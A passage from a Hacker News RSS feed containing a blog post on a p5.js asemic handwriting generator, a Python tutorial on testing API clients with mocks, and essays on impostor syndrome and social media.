<p>I’ll try to explain how this script worked and how I was able to fit the whole thing into 280 characters. If you’re new to p5.js, just try pasting the tweet text to <a href="https://editor.p5js.org/" title="https://editor.p5js.org/">https://editor.p5js.org/</a> to get a similar output.</p>



<p>All of this started when last week when I was experimenting with the p5js <code>curve()</code> function. Internally this is an implementation of the <a href="https://en.wikipedia.org/wiki/Centripetal_Catmull%E2%80%93Rom_spline" title="Centripetal Catmull–Rom spline">Centripetal Catmull–Rom spline</a>. I tried generating a bunch of 8 legged water spiders for fun :)</p>

<video controls="" muted="" src="https://video.twimg.com/ext_tw_video/1303620577589039104/pu/vid/720x720/8iYWjReFxe-9kWVl.mp4?tag=10">
</video>

<p>I admit this looks pretty stupid. The aim was to generate an animation a whole bunch of water spiders with the camera panning around. But then, for me to understand how exactly the Catmull-Rom spline worked, I decided to randomly plot a bunch of curves on a 2D canvas and it somehow resembled handwriting from my native language (<a href="https://en.wikipedia.org/wiki/Malayalam">Malayalam</a>).</p>

<p><img src="https://avinayak.github.io/uploads/download-12.png" alt=""></p>

<p>Actual Malayalam handwriting sample.<br>
<img src="https://avinayak.github.io/uploads/4f31bc2ce9a02537444fc6eeea276dc5.jpg" alt=""></p>

<p>Reducing character spacing.. Do you see the similarity now?<br>
<img src="https://avinayak.github.io/uploads/download-10.png" alt=""></p>

<p>Also, at this time I was playing the PC remaster of <a href="https://en.wikipedia.org/wiki/Journey_(2012_video_game)">Journey (2012)</a>. Journey has a very beautiful blocky scriptures all over the temples in the game.</p>

<p><img src="https://avinayak.github.io/uploads/eayhyxhueaagmqu.jpg" alt=""></p>

<p>I guessed this is pretty easy generate. I made a few attempts to reproduce the approximate style using p5.js</p>

<p><img src="https://avinayak.github.io/uploads/download-8.png" alt=""></p>

<p>and even an infinite scrolling version</p>

<video controls="" muted="" src="https://video.twimg.com/ext_tw_video/1304311867284664323/pu/vid/720x720/zNWZ-LQrIl0KrnCU.mp4?tag=10">
</video>

<p>This script had some serious performance issues(you can see it slowing down towards the end). Later I learned that this style of meaningless writing is a thing in the art community known as Generative <a href="https://en.wikipedia.org/wiki/Asemic_writing">Asemic Writing</a>. According to Wikipedia:</p>

<blockquote>
  <p><strong>Asemic writing</strong> is a wordless open semantic form of writing. The word asemic means “having no specific semantic content”. With the nonspecificity of asemic writing there comes a vacuum of meaning which is left for the reader to fill in and interpret.</p>
</blockquote>

<p>I decided to combine the two and make an infinite generator of malayalam-esque asemic writing. I’ve seen curve generated asemic <a href="https://www.reddit.com/r/asemic/comments/dw5ze3/generative_script/?ref=share&amp;ref_source=link">before</a>. So, What I did is not something new.. however, maybe the way I made it infinite scrolling was something new(?). I’ll try to explain how the code works.</p>



<p>I lost the original script in the minifying process, but I managed to unminify the tweet somehow.</p>

<div><div><pre><code>var yOffset = 24;
var scrollPosition = 0;
var canvasWidth = 800;
var margin = 90

function setup() {
    createCanvas(canvasWidth, canvasWidth)
    noFill();
}

function deterministicRandom(index) {
  return 1000 / 3 * noise(index) - 90
}

function draw() {
    background('#fd7');
    translate(0, scrollPosition--);

    for (i = 0, y = 0; y &lt; canvasWidth - scrollPosition; y += yOffset)
        for (x = 90; x &lt; canvasWidth - margin;) {
            if (y + margin &gt; -scrollPosition) {
                curve(
                  deterministicRandom(i++) + x, 
                  deterministicRandom(i++) + y, 
                  x, 
                  y + yOffset, 
                  x + 9, 
                  y + yOffset, 
                  deterministicRandom(i++) + x, 
                  deterministicRandom(i++) + y
                )
            } else {
                i += 4
            }
            x += (9 + deterministicRandom(i++) % 9)
            if (noise(x * y) &lt; .13)
            {
              y += 2*yOffset
              x = margin
            }
        }

}
</code></pre></div></div>

<p>The most important part of the code is the function <code>deterministicRandom()</code> which is used a lot of times in the sketch. It’s basically <code>noise()</code> but mapped to range <code>[243, -90]</code>. p5 js <code>curve()</code> takes in 2 control point and 2 physical point coordinate to determine the location and shape of the curve. Each character is is thus a set of 4 deterministically random numbers for control points + 4 constants for physical points. All of these points are offset by a base <code>&lt;x,y&gt;</code> coordinate to place the curve in a line. <em>Because it’s deterministically random, the shapes and location of the curves are preserved in every frame</em>.. making the infinite scroll effect work.</p>

<p>The 2 loops iterate over x and y, at a constant rate. x by 9 pixels and y by 24 pixels. But, inside the loop, based on deterministic random, x is randomly incremented by up to 9 pixels to simulate the randomness in spaces between characters. Also, if for a random condition with somewhat low probability (<code>noise(x * y) &lt; .13</code>), a line-break is added. Which means, y is incremented thrice in that loop and x is reset to a margin value (90).</p>





<p>The infinite scroll effect is basically done using <code>translate(0, scrollPosition--)</code>. The loop termination clause is adjusted such that only lines within the frame are rendered (between <code>y = scrollPosition to scrollPosition+canvasHeight</code>). The condition <code>y + margin &gt; -scrollPosition</code> directly inside the loop checks for this. This also offsets the random number index to the one needed by the lines being rendered in the else case. Here’s a version of the script that shows lines being rendered as the script runs:</p>



<p>And that’s basically it. The initial version I designed rendered every line from the first scroll position to the last in every frame, even if those lines were not visible. This is terrible for performance and the if condition inside the loop fixed this.</p>



<p>Step one of minifying was converting all the functions to <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions">arrow functions</a>. This took up way less space. Then I moved all the <code>setup()</code> stuff to <code>draw()</code>. p5 does not re-execute <code>createCanvas</code> even if you place it in <code>draw()</code>. Then I had to cut down number of variables as much as I can. 2 of them were reused: <code>canvasWidth(w)</code> and <code>margin(k)</code> were also used as a coefficient in <code>deterministicRandom()</code>. Finally spaces were removed and long names were truncated to single characters.</p>



<p>This script was written in about 2-3 hours. Looking back, I can see a lot of places where I’d try to reduce repeated code and make it smoother. I never thought this would go so popular, so I never really cared to optimize so much. But there you go.. a simple way to generate bad handwriting :)</p>

</div></div>]]>
            </description>
            <link>https://avinayak.github.io/programming/art/2020/09/18/p5-strokes.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532352</guid>
            <pubDate>Sun, 20 Sep 2020 06:53:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Test API Client Applications in Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532337">thread link</a>) | @miguendes
<br/>
September 19, 2020 | https://miguendes.me/3-ways-to-test-api-client-applications-in-python-ckf9id01c01302zs15m1off81 | <a href="https://web.archive.org/web/*/https://miguendes.me/3-ways-to-test-api-client-applications-in-python-ckf9id01c01302zs15m1off81">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>In this tutorial, we’ll learn how to unit test code that issues HTTP requests in Python. Unit tests are meant to test a single unit of behavior. A well-known rule of thumb is to isolate code that reaches external dependencies. For instance, when testing a code that performs HTTP requests, we must replace the real call by a fake call during test time. This way we can to unit test it without performing a request every time we run the test. The question is, how can we isolate it? Hopefully, that’s what I’m going to answer in this post! I’ll not only show you how to do it but also weigh the pros and cons of each approach.</p>
<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li><a href="#requirements">Requirements</a></li>
<li><a href="#creating-a-demo-app">Creating a Demo App</a><ul>
<li><a href="#retrieving-the-data">Retrieving the Data</a></li>
</ul>
</li>
<li><a href="#1-using-mocks">Using Mocks</a></li>
<li><a href="#2-using-an-adapter">Using an Adapter</a></li>
<li><a href="#3-using-vcrpy">Using <code>VCR.py</code></a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
<h2 id="requirements">Requirements</h2>
<ul>
<li><code>Python 3.8</code></li>
<li><code>pytest-mock</code></li>
<li><code>requests</code></li>
<li><code>flask</code></li>
<li><code>requests</code></li>
<li><code>responses</code></li>
<li><code>VCR.py</code></li>
</ul>
<h2 id="creating-a-demo-app">Creating a Demo App</h2>
<p>To put this problem in context, let's imagine that we're building a weather app. This app uses a third-party API to retrieve weather information for a particular city. Our app must generate a simple HTML page, like the image below.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1600427026729/SbZKkiywH.png?auto=format&amp;q=60" alt="weather_app.png">
To get the information about the weather, we must find it somewhere. Fortunately,  <a target="_blank" href="https://openweathermap.org/">OpenWeatherMap</a> provides everything we need through its REST API service.</p>
<blockquote>
<p>Ok, that's cool, but how can we use it? </p>
</blockquote>
<p>We can get everything we need by sending a GET request to: <code>'https://api.openweathermap.org/data/2.5/weather?q={city_name}&amp;appid={api_key}&amp;units=metric'</code>. For this tutorial, we’ll parametrize the city name and settle with the metric unit.</p>
<h3 id="retrieving-the-data">Retrieving the Data</h3>
<p>To retrieve the weather data, we'll use <a target="_blank" href="https://github.com/psf/requests"><code>requests</code></a>. We can create a function that receives a city name as parameter and returns a <em>json</em>. The <em>json</em> will contain the temperature, weather description, sunset, sunrise time and so on. </p>
<p>The example below illustrates such function.</p>
<pre><code><span><span>def</span> <span>find_weather_for</span>(<span>city: str</span>) -&gt; dict:</span>
    <span>"""Queries the weather API and returns the weather data for a particular city."""</span>
    url = API.format(city_name=city, api_key=API_KEY)
    resp = requests.get(url)
    <span>return</span> resp.json()
</code></pre>
<p>The URL is made up from two global variables.</p>
<pre><code>BASE_URL = <span>"https://api.openweathermap.org/data/2.5/weather"</span>
API = BASE_URL + <span>"?q={city_name}&amp;appid={api_key}&amp;units=metric"</span>
</code></pre>
<p>The API returns a <em>json</em> in this format:</p>
<pre><code>{
  <span>"coord"</span>: {
    <span>"lon"</span>: <span>-0.13</span>,
    <span>"lat"</span>: <span>51.51</span>
  },
  <span>"weather"</span>: [
    {
      <span>"id"</span>: <span>800</span>,
      <span>"main"</span>: <span>"Clear"</span>,
      <span>"description"</span>: <span>"clear sky"</span>,
      <span>"icon"</span>: <span>"01d"</span>
    }
  ],
  <span>"base"</span>: <span>"stations"</span>,
  <span>"main"</span>: {
    <span>"temp"</span>: <span>16.53</span>,
    <span>"feels_like"</span>: <span>15.52</span>,
    <span>"temp_min"</span>: <span>15</span>,
    <span>"temp_max"</span>: <span>17.78</span>,
    <span>"pressure"</span>: <span>1023</span>,
    <span>"humidity"</span>: <span>72</span>
  },
  <span>"visibility"</span>: <span>10000</span>,
  <span>"wind"</span>: {
    <span>"speed"</span>: <span>2.1</span>,
    <span>"deg"</span>: <span>40</span>
  },
  <span>"clouds"</span>: {
    <span>"all"</span>: <span>0</span>
  },
  <span>"dt"</span>: <span>1600420164</span>,
  <span>"sys"</span>: {
    <span>"type"</span>: <span>1</span>,
    <span>"id"</span>: <span>1414</span>,
    <span>"country"</span>: <span>"GB"</span>,
    <span>"sunrise"</span>: <span>1600407646</span>,
    <span>"sunset"</span>: <span>1600452509</span>
  },
  <span>"timezone"</span>: <span>3600</span>,
  <span>"id"</span>: <span>2643743</span>,
  <span>"name"</span>: <span>"London"</span>,
  <span>"cod"</span>: <span>200</span>
}
</code></pre>
<p>The data is returned as a python dictionary when we call <code>resp.json()</code>. In order to encapsulate all the details, we can represent them as a <code>dataclass</code>. This class has a factory method that gets the dictionary and returns a <code>WeatherInfo</code> instance.</p>
<p>This is good because we keep the representation stable. For example, if the API changes the way it structures the <em>json</em>, we can change the logic in just one place, in the <code>from_dict</code> method. So, other parts of the code won’t be affected. We can even get information from different sources and combining them in the <code>from_dict</code> method!</p>
<pre><code><span>@dataclass</span>
<span><span>class</span> <span>WeatherInfo</span>:</span>
    temp: float
    sunset: str
    sunrise: str
    temp_min: float
    temp_max: float
    desc: str

<span>    @classmethod</span>
    <span><span>def</span> <span>from_dict</span>(<span>cls, data: dict</span>) -&gt; "WeatherInfo":</span>
        <span>return</span> cls(
            temp=data[<span>"main"</span>][<span>"temp"</span>],
            temp_min=data[<span>"main"</span>][<span>"temp_min"</span>],
            temp_max=data[<span>"main"</span>][<span>"temp_max"</span>],
            desc=data[<span>"weather"</span>][<span>0</span>][<span>"main"</span>],
            sunset=format_date(data[<span>"sys"</span>][<span>"sunset"</span>]),
            sunrise=format_date(data[<span>"sys"</span>][<span>"sunrise"</span>]),
        )
</code></pre>
<p>Now, let's create a function called <code>retrieve_weather</code>. We'll use this function to call the API and return a <code>WeatherInfo</code> so we can build our HTML page.</p>
<pre><code><span><span>def</span> <span>retrieve_weather</span>(<span>city: str</span>) -&gt; WeatherInfo:</span>
    <span>"""Finds the weather for a city and returns a WeatherInfo instance."""</span>
    data = find_weather_for(city)
    <span>return</span> WeatherInfo.from_dict(data)
</code></pre>
<p>Good, we have the basic building blocks for our app. Before moving forward, let's unit test those functions.</p>
<h2 id="1-using-mocks">1. Using Mocks</h2>
<p><a target="_blank" href="https://en.wikipedia.org/wiki/Mock_object">According to wikipedia</a>, a mock object is an object that simulates the behavior of a real object by mimicking it. In Python, we can mock any object using the <code>unittest.mock</code> lib that is part of the standard library. To test the <code>retrieve_weather</code> function, we can then mock <code>requests.get</code> and return a static data.</p>
<h3 id="pytest-mock"><code>pytest-mock</code></h3>
<p>For this tutorial, we’ll use <code>pytest</code> as our testing framework of choice. <code>pytest</code> is a very extensible library that allows the extension through plugins. And to accomplish our <em>mocking</em> goals, let’s use <code>pytest-mock</code>. This plugin abstracts a bunch of setups from <code>unittest.mock</code> and makes our testing code very concise. If you are curious, I discuss more about it in <a target="_blank" href="https://miguendes.me/7-pytest-plugins-you-must-definitely-use-ckesvzzt60014e2s1b89a08o7">another blog post</a>.</p>
<blockquote>
<p>Ok, enough talking, show me the code.</p>
</blockquote>
<p>Here's a complete test case for the <code>retrieve_weather</code> function. This test uses two fixures, one is the <code>mocker</code> fixture provided by the <code>pytest-mock</code> plugin. The other one is ours. It's just the static data we saved from a previous request.</p>
<pre><code><span>@pytest.fixture()</span>
<span><span>def</span> <span>fake_weather_info</span>():</span>
    <span>"""Fixture that returns a static weather data."""</span>
    <span>with</span> open(<span>"tests/resources/weather.json"</span>) <span>as</span> f:
        <span>return</span> json.load(f)
</code></pre>
<pre><code><span><span>def</span> <span>test_retrieve_weather_using_mocks</span>(<span>mocker, fake_weather_info</span>):</span>
    <span>"""Given a city name, test that a HTML report about the weather is generated
    correctly."""</span>
    
    fake_resp = mocker.Mock()
    
    fake_resp.json = mocker.Mock(return_value=fake_weather_info)
    
    fake_resp.status_code = HTTPStatus.OK

    mocker.patch(<span>"weather_app.requests.get"</span>, return_value=fake_resp)

    weather_info = retrieve_weather(city=<span>"London"</span>)
    <span>assert</span> weather_info == WeatherInfo.from_dict(fake_weather_info)
</code></pre>
<p>If we run the test, we get the following output:</p>
<pre><code>============================= test session starts ==============================
...[omitted]...
tests/test_weather_app.py::test_retrieve_weather_using_mocks PASSED      [100%]
============================== 1 passed in 0.20s ===============================
Process finished with exit code 0
</code></pre>
<p>Great, our tests pass! But... Life is not a bed of roses. This test has pros and cons. Let's take a look at them.</p>
<h4 id="pros">Pros</h4>
<p>Well, one pro we already discussed is that by mocking the return of the API we make our tests easier. We isolate the communication with the API and make the test predictable. It will always return what we want.</p>
<h4 id="cons">Cons</h4>
<p>As cons, the problem is, what if we don’t want to use <code>requests</code> anymore and decide to go with the standard’s lib <code>urllib</code>. Every time we change the implementation of <code>find_weather_for</code> we will have to adapt the test. A good test is a test that doesn’t change when our implementation change. So, by mocking, we end up coupling our test with the implementation.</p>
<p>Also, another downside is the amount of setup we have to do before calling the function. At lest, 3 lines of code.</p>
<pre><code>...
    
    fake_resp = mocker.Mock()
    
    fake_resp.json = mocker.Mock(return_value=fake_weather_info)
    
    fake_resp.status_code = HTTPStatus.OK
...
</code></pre>
<blockquote>
<p>Can we do better? </p>
</blockquote>
<p>Yes, please, follow along. Let's see now how to improve it a bit.</p>
<h3 id="responses"><code>responses</code></h3>
<p>Mocking <code>requests</code> using the <code>mocker</code> feature has the downside of having a long setup. A good way to avoid that is to use a library that intercepts <code>requests</code> calls and patch it. There are more than one lib for that, but simplest to me is <code>responses</code>. Let’s see how can we use it to replace <code>mock</code>.</p>
<pre><code><span>@responses.activate</span>
<span><span>def</span> <span>test_retrieve_weather_using_responses</span>(<span>fake_weather_info</span>):</span>
    <span>"""Given a city name, test that a HTML report about the weather is generated
    correctly."""</span>
    api_uri = API.format(city_name=<span>"London"</span>, api_key=API_KEY)
    responses.add(responses.GET, api_uri, json=fake_weather_info, status=HTTPStatus.OK)

    weather_info = retrieve_weather(city=<span>"London"</span>)
    <span>assert</span> weather_info == WeatherInfo.from_dict(fake_weather_info)
</code></pre>
<p>Again, this function makes use of our <code>fake_weather_info</code> fixture.</p>
<p>Good... let's run the test.</p>
<pre><code>============================= test session starts ==============================
...
tests/test_weather_app.py::test_retrieve_weather_using_responses PASSED  [100%]
============================== 1 passed in 0.19s ===============================
</code></pre>
<p>Great! This test pass too. But... It's still not that great...</p>
<h3 id="pros">Pros</h3>
<p>The good thing about using libraries like <code>responses</code> is that we don't need to patch <code>requests</code> ourselves. We save some setup by delegating the abstraction to the library. However, in case you haven't noticed, we have problems.</p>
<h3 id="cons">Cons</h3>
<p>Again, the problem is, much like <code>unittest.mock</code>, our test is coupled to the implementation. If we replace <code>requests</code>, our test break.</p>
<h2 id="2-using-an-adapter">2. Using an Adapter</h2>
<blockquote>
<p>If by using mocks we couple our tests, what can we do?</p>
</blockquote>
<p>Let’s image the following scenario: Say that we can no longer use <code>requests</code> and we’ll have to replace it by <code>urllib</code>, since it comes with Python. Not only that, we learned the lessons of not coupling test code with implementation and we want to avoid that in the future. We want to replace <code>urllib</code> and not have to rewrite the tests.</p>
<p>It turns out we can abstract away the code that performs the GET request.</p>
<blockquote>
<p>Really? How?</p>
</blockquote>
<p>We can abstract it by using an adapter. The adapter is a design pattern that is used to encapsulate, or wrap, the interface of other class and expose it as a new interface. This way we can change the adapters without changing our code. For example, we can encapsulate the details about <code>requests</code> in our <code>find_weather_for</code> and expose it via a function that takes only the URL.</p>
<p>So, this...</p>
<pre><code><span><span>def</span> <span>find_weather_for</span>(<span>city: str</span>) -&gt; dict:</span>
    <span>"""Queries the weather …</span></code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://miguendes.me/3-ways-to-test-api-client-applications-in-python-ckf9id01c01302zs15m1off81">https://miguendes.me/3-ways-to-test-api-client-applications-in-python-ckf9id01c01302zs15m1off81</a></em></p>]]>
            </description>
            <link>https://miguendes.me/3-ways-to-test-api-client-applications-in-python-ckf9id01c01302zs15m1off81</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532337</guid>
            <pubDate>Sun, 20 Sep 2020 06:47:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You Are an Impostor]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532307">thread link</a>) | @abyx
<br/>
September 19, 2020 | https://softwaresaltmines.com/2020/09/09/you-are-an-impostor/ | <a href="https://web.archive.org/web/*/https://softwaresaltmines.com/2020/09/09/you-are-an-impostor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-2229">

	
<!-- .entry-header -->

	<div>

		<div>

			
<h5>By Jim Grey (<a rel="noreferrer noopener" href="https://softwaresaltmines.com/about/" target="_blank">about</a>)</h5>



<p>I hired a software developer right out of college. He had a lot to learn, but he learned it steadily. Yet he admitted to me privately that he wasn’t sure he belonged. He thought that the other developers spoke so confidently and delivered so competently. He compared himself to them and, in his mind, came up wanting.</p>



<div><figure><img loading="lazy" data-attachment-id="2237" data-permalink="https://dev.jimgrey.net/me-at-crown-hill/" data-orig-file="https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg" data-orig-size="1071,1339" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;Jim Grey&quot;,&quot;camera&quot;:&quot;F2AS&quot;,&quot;caption&quot;:&quot;Nikon F2\r50mm f\/2 AI Nikkor\rFujifilm Neopan 100 Acros\r\rMy son Damion shot these. I was going for a serious look but I think what I got was a bored look.&quot;,&quot;created_timestamp&quot;:&quot;1472162857&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;Me at Crown Hill&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="Me at Crown Hill" data-image-description="" data-medium-file="https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=240" data-large-file="https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=580" src="https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=819" alt="" width="413" height="516" srcset="https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=819 819w, https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=413 413w, https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=826 826w, https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=120 120w, https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=240 240w, https://softwaresaltmines.files.wordpress.com/2020/09/impostor.jpg?w=768 768w" sizes="(max-width: 413px) 100vw, 413px"><figcaption>Impostor.</figcaption></figure></div>



<p>What he didn’t know was that I was leading developers for the first time. I’d been in management roles in the industry for a very long time, but always of testing and communications teams. </p>



<p>Worse, I hadn’t written a meaningful line of code in about a decade. Even then, most of that code was test automation. That’s not the same as writing product code.</p>



<p>Yet here I was, leading developers. The CTO who hired me wanted my skill in managing people, leading projects, and refining process. But I had so much to learn about modern software development. It was embarrassing to need the developers to explain the basics to me.</p>



<p>I told this young developer this story and admitted that I felt like an impostor, too. But I’d experienced impostor syndrome before. I knew that with effort and time I’d learn what I needed to learn and the feeling would abate. More importantly, even with all I needed to learn, I knew I had something valuable to offer right now. He did too, I told him.</p>



<p>We all figure it out as we go. In time, we build experience that lets us get it right more often.</p>



<p>What I wish I’d told him, what I’ve learned since then, is that there are three kinds of impostors. There are the impostors who don’t know they’re impostors. They’re so self-possessed that they overestimate themselves. There are the impostors who know it but do everything they can to hide it. They live in fear and anxiety that they will be found out. And then there are the impostors who know it, admit it to themselves, and sometimes even admit it to others. They’re the ones who can grow the fastest.</p>



<p>This young developer was the best kind: he admitted it. It let me tell him my own story, which helped put his mind at ease. Then it let us talk frankly about the areas where he felt like he didn’t know what he was doing, so I could pair him with other engineers who could level him up faster.</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
		<!-- .comments-wrapper -->

		
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://softwaresaltmines.com/2020/09/09/you-are-an-impostor/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532307</guid>
            <pubDate>Sun, 20 Sep 2020 06:37:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Internet, Social Media and the Individual]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24532213">thread link</a>) | @nktsg
<br/>
September 19, 2020 | https://techimadions.com/internet-social-media-individual/ | <a href="https://web.archive.org/web/*/https://techimadions.com/internet-social-media-individual/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As the COVID-19 pandemic has proliferated and as we have come to terms with it, the Internet became the heartbeat of our world. It has already become ubiquitous in our lives but the pandemic has forced people and businesses to realize how our socioeconomic lives have become dependent on it. This is only going to accelerate in the coming years considering the new ways of work and interaction people have adopted over the previous few months.</p>
<p>On the other hand, this has left people with increased psychological disquiet since we're already overwhelmed by the influence of the Internet and social media in our day to day lives. It's ever more important to reflect on our relationship with the Internet on the individual front and ask hard questions about our future with it.</p>
<p>The following are some of my reflections on the current state of the influence of the Internet in our individual lives and what can be done.</p>
<h3>Connected But Dejected</h3>
<p>We are living in the most connected times, yet we've never felt more isolated collectively. Our phones ring with so many notifications in a day that no single notification has more value. The asynchronicity of our communication patterns has no definite coherent start and end. Text is not suitable for hourly long conversations over food and drinks; so now we talk in bits and pieces. Instant messaging has made communication so cheap and effortless that talking on the phone for more than a few minutes feels like dread. Social media, online news, and videos on anything take so much of our time that later we end up deciding whether to work or check for what's up with a friend/family member.</p>
<p>I think it's not the time that we end up sacrificing, it's the fear of missing out of things. Information moves so fast on the Internet that we trade-off attention for aggregation. We've started to live in two realities. One is physical and the other is digital and unfortunately, the digital one is taking the lead. Even when we are in the physical one, we left some part of ourselves in the digital one. It's like we're sailing two boats at the same time. We're in constant flux. It's not so difficult to map both the realities with the characteristics of the modern world that humans cherish. The digital one is fast, productive, opportunistic, economic, scalable, reliable, and mostly non-discriminatory. But all this comes at the cost of our psychological health. While we marvel at the disruptive innovations of digital connection that the Internet has sown seeds for, it's no substitute for our fundamental biological and physical need for connection. We still long to sense fellow humans by engaging with them in a physical medium. And that's when our psychological instincts find refuge.</p>
<h3>The Desire For Feedback</h3>
<p>We are a creature that loves attention. This starts from the day we are born. Babies demand attention to care. Teens demand attention to self-esteem. Adults require attention to form new connections that help in job prospects. Attention is a natural and necessary part of our biological behavior. The problem occurs when instead of getting attention as a result of our personalities, we tend to <strong>seek</strong> attention. What popular culture does is divide people into two categories: the influencer and the follower. Class-based societies are everywhere in the world. But popular culture creates another category.</p>
<p>Before the internet, there were fixed avenues for a person to become popular. Internet followed by social media turned the table upside down. And after the smartphone revolution, anyone having a phone got the tools to broadcast to possibly every other person on the planet. Social media started with networks of friends and family and platforms like Instagram and YouTube eventually turned it into a worldwide virtual stage.</p>
<p>Now, everybody has got everybody's attention. The playing field has been leveled. Everyone wants a piece of it. This behavior is not permanent though. In the end, everybody can't win. Since social media is far less daunting than the physical space, we tend to delegate the feedback mechanism of society to it. The effort required to represent oneself is frugal and the consequences are far less intimidating. And since the said rules and codes of society are not applicable here, the expectation for feedback increases.</p>
<h3>The Perfect Life Diet</h3>
<p>Social media was started as a way to connect with friends and family. At least, it was projected like that. It's not that we didn't have mediums for that before. I think it provided a great escape from physical reality especially for teens and young adults. We know that these years are an intimidating phase of our lives. Connecting with other people to know a little more something about their life and creating your persona was way much easier.</p>
<p>Once all the young people onboarded, the network effects made the older generation to join it. Text was still a banal way of sharing your life. Soon after, the social media companies realized that photos are more stimulating to us than text and activate more parts of our brain. Then came platforms like Instagram and Snapchat. Photos became the dominant media crossing through our minds. <a href="https://marshallmcluhan.com/">Marshall McLuhan</a> in his book quotes that in the long run, content matters less than the medium itself in influencing how we think and act. Soon after, the advertisers got hold of this fact and since more people were shifting to these platforms leaving TV and newspapers behind, advertising gave way for people to make some extra cash. Eventually, the ship started sailing and marketing picked up speed.</p>
<p>Advertising has always worked on exaggerated product characteristics and contrived human behaviors. As a result, people started sharing their ideal lives. The perfect couple, the perfect job, the perfect clothing, the perfect diet, the perfect fitness regime, the perfect accessories, the perfect home, the perfect vacation became mainstream outlook.  Some people post multiple photos in a single day. Young people have even started to start their professional journey on social media. Dissatisfaction start to seep in when we start to compare our persona with other people's personas. Comparison is a natural trait of us. That's how we perceive the world around us and separate one thing from another.</p>
<p>But it doesn't work the same way in the physical and digital space. In the physical space, there can only be a handful of objects or people in our line of vision. Hence, our brains get an ample amount of time to process our emotions.  This changes completely in the digital space. We go through so much media in so little time that the brain is not able to register all of them at the moment. Instead, it registers hooks to all the information which resurface later in our daily lives</p>
<h3>Mimetic Paralysis</h3>
<p><a href="https://iep.utm.edu/girard/">René Girard's</a> Mimetic theory’s key insight is that human desire is not an autonomous process, but a collective one. We want things because other people want them. This is ever more visible today as we spend more of our time watching what's going on with other people and the world. The increased consumption of digital media might be rewiring our brain structures in ways that we don't understand yet. While we are mapping our social behaviors in the physical world onto the digital world, our digital persona is creating a space of its own. This novel persona is being shaped by the values and norms of the digital atmosphere.</p>
<p>We can already see the effect on how people have started curating their digital persona according to these rules and how the nature of every social profile has started to look the same. Someone creates a new style of content and soon after you can see mushrooms of other people creating the same content. It's not a special trait of social media. Just that it has aggravated this trend. We don't realize when our digital worlds start to influence our physical world. The places we go, the things we buy, the food we eat. Some people have started even doing things in their physical worlds just to enhance their digital curation. The mostly independent nature of social media also attracts many of the young people. Bringing up connected is also a huge reason for the current generation of teens trying to find a stable work opportunity out of it.</p>
<h3>The Information Rabbit Hole</h3>
<p>How many times have you opened a bunch of links in different browser tabs; all seeming interesting just to realize that you can't possibly read all of it? How many times have you started watching something on YouTube just to realize that it's been hours? Every new second, someone is publishing content somewhere in the world. And it's all available instantly. There are no distribution costs. There is simply too much information now. There are news sites, wiki sites, videos, blog posts, independent publishers, newsletters, twitter threads, documentaries, etc.</p>
<p>But information is not a substitute for knowledge. This is a great misunderstanding of the post-internet era. Cramming our minds with disparate information doesn't make us knowledgeable. The brain is a very efficient machine. It doesn't retain information which it doesn't find useful regularly. That's why however a great article you've read days ago, you don't remember much of it.  We've delegated memorization to search engines. Memorization is a key element in forming a solid understanding of the world.  Since there is so much content, every different person is reading, watching, and listening to different things.</p>
<p>That's why it's getting harder to talk or chat about a common topic of interest. Consequences are FOMO and despair. You're now subject to know every social, political, national, geopolitical news. Every second something bad is happening in some part of the world and it's all visible in plain sight. But we can't do much about any single incident. This ends up in a lot of mental despair. In the end, we've to pick our battles. There is limited fuel in our brains and it's in our control what we choose to put it at work.</p>
<h3>Where's the …</h3></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://techimadions.com/internet-social-media-individual/">https://techimadions.com/internet-social-media-individual/</a></em></p>]]>
            </description>
            <link>https://techimadions.com/internet-social-media-individual/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532213</guid>
            <pubDate>Sun, 20 Sep 2020 06:09:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is macOS under the biggest malware attack ever?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532184">thread link</a>) | @todsacerdoti
<br/>
